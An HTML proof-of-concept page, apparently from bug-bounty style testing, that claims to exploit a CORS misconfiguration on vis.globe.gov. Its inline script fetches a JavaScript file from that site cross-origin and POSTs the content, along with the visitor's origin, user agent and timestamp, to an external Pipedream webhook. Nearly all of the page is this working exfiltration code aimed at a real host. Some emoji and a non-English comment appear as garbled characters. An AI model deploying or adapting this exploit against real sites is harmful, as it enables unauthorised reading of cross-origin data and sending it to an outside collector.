<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GLOBE.gov CORS Exploit</title>
</head>
<body>
<h2>ğŸ§ª Testing vis.globe.gov CORS Misconfiguration</h2>
<pre id="output">Starting PoC...</pre>

<script>
const webhook = "https://eo6hxedl2p03s10.m.pipedream.net";

function log(msg) {
  document.getElementById("output").textContent += "\n" + msg;
  console.log(msg);
}

(async () => {
  try {
    log("ğŸ“¡ Fetching from vis.globe.gov...");
    const response = await fetch("https://vis.globe.gov/GLOBE/javascript/VISmain.js");
    log("âœ… Response Status: " + response.status);

    const content = await response.text();
    const payload = `
Exploit Success:
Origin: ${location.origin}
User-Agent: ${navigator.userAgent}
Timestamp: ${new Date().toISOString()}

--- JS Content Sample ---
${content.slice(0, 500)}
    `;

    const xhr = new XMLHttpRequest();
    xhr.open("POST", webhook, true);
    xhr.setRequestHeader("Content-Type", "text/plain"); // âœ… Ù…ØªÙˆØ§ÙÙ‚ Ù…Ø¹ CORS
    xhr.onreadystatechange = () => {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        log("ğŸ“¤ Data sent to Pipedream!");
        log("Status: " + xhr.status);
      }
    };
    xhr.send(payload);
  } catch (e) {
    log("âŒ Error: " + e.message);
  }
})();
</script>
</body>
</html>
